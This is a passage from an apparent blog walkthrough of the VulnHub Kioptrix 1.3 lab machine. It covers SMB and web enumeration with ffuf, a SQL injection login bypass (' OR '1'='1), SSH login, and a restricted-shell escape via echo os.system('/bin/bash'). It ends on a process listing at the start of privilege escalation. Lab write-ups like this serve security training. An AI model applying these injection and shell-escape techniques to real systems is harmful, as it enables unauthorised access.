        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Printer Drivers
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Kioptrix4 server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
Reconnecting with SMB1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;workgroup listing.

        Server               Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;

        Workgroup            Master
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        WORKGROUP            DESKTOP-PI36PQ0

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Attempting to map shares on 10.0.0.151
//10.0.0.151/print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;    Mapping: DENIED, Listing: N/A
//10.0.0.151/IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] Can&lt;span class=&quot;s1&quot;&gt;'t understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, that should cover SMB. Moving on to HTTP.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-http&quot;&gt;Enumerating HTTP&lt;/h3&gt;

&lt;p&gt;Per usual we’ll start by vising the website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.3_1.PNG&quot; alt=&quot;Website homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we’ve got a login form. Let’s get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; running in the background while we keep looking:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.0.0.151/FUZZ

        /&lt;span class=&quot;s1&quot;&gt;'___\  /'&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git                                                                                                                                                                                                                          
________________________________________________                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 :: Method           : GET                                                                                                                                                                                                                 
 :: URL              : http://10.0.0.151/FUZZ                                                                                                                                                                                              
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt                                                                                                                                                  
 :: Follow redirects : false                                                                                                                                                                                                               
 :: Calibration      : false                                                                                                                                                                                                               
 :: Timeout          : 10                                                                                                                                                                                                                  
 :: Threads          : 40                                                                                                                                                                                                                  
 :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                                                                                                        
________________________________________________                                                                                                                                                                                           
                                                                                                                                                                                                                                           
member                  [Status: 302, Size: 220, Words: 22, Lines: 2]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
images                  [Status: 301, Size: 348, Words: 23, Lines: 10]
index                   [Status: 200, Size: 1255, Words: 50, Lines: 46]
                        [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# on atleast 2 different hosts [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 1255, Words: 50, Lines: 46]
john                    [Status: 301, Size: 346, Words: 23, Lines: 10]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# This work is licensed under the Creative Commons  [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Copyright 2007 James Fisher [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# directory-list-2.3-medium.txt [Status: 200, Size: 1255, Words: 50, Lines: 46]
robert                  [Status: 301, Size: 348, Words: 23, Lines: 10]
                        [Status: 200, Size: 1255, Words: 50, Lines: 46]
server-status           [Status: 403, Size: 330, Words: 24, Lines: 11]
:: Progress: [220560/220560] :: Job [1/1] :: 10502 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm..&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robert&lt;/code&gt; stick out, let’s take a look:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.3_2.PNG&quot; alt=&quot;Looking at the interesting sub-directories&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;Just a directory listing, and it looks like clicking on either file just redirects us to the homepage:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.3_3.PNG&quot; alt=&quot;302 Redirections&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Weird, well lets account for any low hanging fruit, starting with some weak password/SQLi guessing. Remember at this point we have the following usernames to test with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robert&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loneferret&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I’ll start with attempting to login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; with a password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' OR '1'='1&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.3_4.PNG&quot; alt=&quot;302 Redirections&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And sure enough that got us in. Let’s take a look at what the internal webpage looks like now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.3_5.PNG&quot; alt=&quot;Logged in page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pretty straightforward, let’s try to use these creds to connect via SSH:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.3:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh john@10.0.0.151
john@10.0.0.151&lt;span class=&quot;s1&quot;&gt;'s password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don'&lt;/span&gt;t screw up
Type &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; to get the list of allowed commands
john:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help
cd  &lt;/span&gt;clear  &lt;span class=&quot;nb&quot;&gt;echo  exit  help  &lt;/span&gt;ll  lpath  &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;john:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interesting, we’re dropped in but we’re in a restricted shell.&lt;/p&gt;

&lt;p&gt;Now that we have a working (but restricted) shell on the box, let’s try to exploit the available commands to break out of our &lt;em&gt;protections&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;First thing I notice is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt;, maybe we can use this to execute a python command through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.system()&lt;/code&gt;?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;john&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;john&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;john&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/bash
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Boom. Escaped the confines and have a full Bash session, now for privesc to root.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;I’ll begin by taking a look at the running processes on the host:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2844  1692 ?        Ss   19:48   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kthreadd]
root         3  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;migration/0]
root         4  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;watchdog/0]
root         6  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;events/0]
root         7  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;khelper]
root        41  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kblockd/0]
root        44  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kacpid]
root        45  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kacpi_notify]
root        88  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kseriod]
root       127  0.0  0.0      0     0 ?        S    19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pdflush]
root       128  0.0  0.0      0     0 ?        S    19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pdflush]                                                                                                                                                                 
root       129  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kswapd0]                                                                                                                                                                 
root       171  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;aio/0]                                                                                                                                                                   
root      1277  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ata/0]                                                                                                                                                                   
root      1284  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ata_aux]                                                                                                                                                                 
root      1294  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksuspend_usbd]                                                                                                                                                           
root      1299  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;khubd]                                                                                                                                                                   
root      1968  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;scsi_eh_0]                                                                                                                                                               
root      1970  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;scsi_eh_1]                                                                                                                                                               
root      2186  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kjournald]                                                                                                                                                               
root      2353  0.0  0.0   2224   632 ?        S&amp;lt;s  19:48   0:00 /sbin/udevd &lt;span class=&quot;nt&quot;&gt;--daemon&lt;/span&gt;                                                                                                                                                      
root      2573  0.0  0.0      0     0 ?        S&amp;lt;   19:48   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kpsmoused]                                                                                                                                                               
root      3864  0.0  0.0   1716   484 tty4     Ss+  19:48   0:00 /sbin/getty 38400 tty4                                                                                                                                                    
root      3867  0.0  0.0   1716   492 tty5     Ss+  19:48   0:00 /sbin/getty 38400 tty5                                                                                                                                                    
root      3873  0.0  0.0   1716   488 tty2     Ss+  19:48   0:00 /sbin/getty 38400 tty2                                                                                                                                                    
root      3876  0.0  0.0   1716   484 tty3     Ss+  19:48   0:00 /sbin/getty 38400 tty3                                                                                                                                                    
root      3881  0.0  0.0   1716   488 tty6     Ss+  19:48   0:00 /sbin/getty 38400 tty6                                                                                                                                                    
syslog    3913  0.0  0.0   1936   648 ?        Ss   19:48   0:00 /sbin/syslogd &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; syslog                                                                                                                                                   
root      3932  0.0  0.0   1872   544 ?        S    19:48   0:00 /bin/dd bs 1 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; /proc/kmsg of /var/run/klogd/kmsg                                                                                                                         
klog      3934  0.0  0.0   3160  1968 ?        Ss   19:48   0:00 /sbin/klogd &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /var/run/klogd/kmsg
root      3953  0.0  0.0   5316   988 ?        Ss   19:48   0:00 /usr/sbin/sshd
root      4009  0.0  0.0   1772   528 ?        S    19:48   0:00 /bin/sh /usr/bin/mysqld_safe
root      4051  0.0  0.7 126988 16360 ?        Sl   19:48   0:00 /usr/sbin/mysqld &lt;span class=&quot;nt&quot;&gt;--basedir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--datadir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/lib/mysql &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root &lt;span class=&quot;nt&quot;&gt;--pid-file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/run/mysqld/mysqld.pid &lt;span class=&quot;nt&quot;&gt;--skip-external-locking&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3306 &lt;span class=&quot;nt&quot;&gt;--socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/run/mysqld/my
root      4053  0.0  0.0   1700   556 ?        S    19:48   0:00 logger &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; daemon.err &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; mysqld_safe &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; mysqld
root      4126  0.0  0.0   6532  1356 ?        Ss   19:48   0:00 /usr/sbin/nmbd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt;
root      4128  0.0  0.1  10108  2540 ?        Ss   19:48   0:00 /usr/sbin/smbd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt;
root      4142  0.0  0.0  10108  1028 ?        S    19:48   0:00 /usr/sbin/smbd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt;
root      4143  0.0  0.0   8084  1344 ?        Ss   19:48   0:00 /usr/sbin/winbindd
root      4148  0.0  0.0   8208  1704 ?        S    19:48   0:00 /usr/sbin/winbindd
daemon    4164  0.0  0.0   1984   424 ?        Ss   19:48   0:00 /usr/sbin/atd
root      4175  0.0  0.0   2104   888 ?        Ss   19:48   0:00 /usr/sbin/cron
root      4197  0.0  0.2  20464  6200 ?        Ss   19:48   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
dhcp      4247  0.0  0.0   2440   624 ?        Ss   19:48   0:00 dhclient eth2
root      4254  0.0  0.0   1716   488 tty1     Ss+  19:48   0:00 /sbin/getty 38400 tty1
root      4273  0.0  0.0   8084   868 ?        S    19:56   0:00 /usr/sbin/winbindd
root      4274  0.0  0.0   8092  1280 ?        S    19:56   0:00 /usr/sbin/winbindd
www-data  4615  0.0  0.2  20620  5936 ?        S    20:03   0:01 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  4617  0.0  0.2  20596  5732 ?        S    20:03   0:01 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  4620  0.0  0.2  20620  5944 ?        S    20:03   0:01 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  4660  0.0  0.2  20596  5664 ?        S    20:03   0:01 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  4676  0.0  0.2  20596  5688 ?        S    20:03   0:01 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  4679  0.0  0.2  20604  5672 ?        S    20:06   0:01 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
root      4886  0.0  0.1  11360  3732 ?        Ss   21:23   0:00 sshd: john &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;priv]
john      4888  0.0  0.0  11516  1868 ?        S    21:23   0:00 sshd: john@pts/0 
john      4889  0.0  0.1   5892  3820 pts/0    Ss   21:23   0:00 python /bin/kshell
john      4894  0.0  0.0   1772   484 pts/0    S    21:26   0:00 sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin/bash
john      4895  0.0  0.1   5444  2872 pts/0    S    21:26   0:00 /bin/bash
root      4969  0.0  0.0   4072  1588 pts/0    S+   21:49   0:00 bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
www-data  5330  0.0  0.2  20464  4396 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5331  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5332  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5334  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5335  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5336  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5338  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5339  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5340  0.0  0.2  20488  4248 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5343  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5345  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5346  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5347  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5348  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5349  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5350  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5351  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5352  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5353  0.0  0.1  20464  3764 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5354  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5355  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5356  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5359  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5360  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5362  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5363  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5364  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5365  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5366  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5368  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5369  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5370  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5372  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5374  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5376  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5377  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5378  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5379  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5380  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5381  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5382  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5383  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5384  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5386  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5387  0.0  0.1  20464  3764 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5388  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5389  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
www-data  5390  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
root      5393  0.0  0.1  11360  3720 ?        Ss   23:28   0:00 sshd: john &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;priv]
john      5395  0.0  0.0  11516  1856 ?        R    23:29   0:00 sshd: john@pts/1 
john      5396  0.0  0.1   6000  3824 pts/1    Ss   23:29   0:00 python /bin/kshell
john      5403  0.0  0.0   1772   488 pts/1    S    23:32   0:00 sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin/bash
john      5404  0.0  0.0   4580  1856 pts/1    R    23:32   0:00 /bin/bash
john      5406  0.0  0.0   2644  1012 pts/1    R+   23:33   0:00 ps aux
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
